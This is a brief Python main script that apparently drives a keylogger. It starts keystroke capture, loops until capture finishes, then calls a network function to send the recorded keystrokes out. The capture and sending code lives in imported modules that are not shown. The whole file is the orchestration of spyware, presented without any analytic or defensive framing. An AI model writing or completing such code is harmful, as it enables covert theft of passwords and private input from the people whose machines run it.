from keylogger import start_keylogger
from network import send_keylogs
import utils

if __name__ == '__main__':
    # Start keylogger
    start_keylogger()

    # Wait for keylogger to finish
    while not utils.keylogger_finished():
        pass

    # Send keylogs
    send_keylogs()
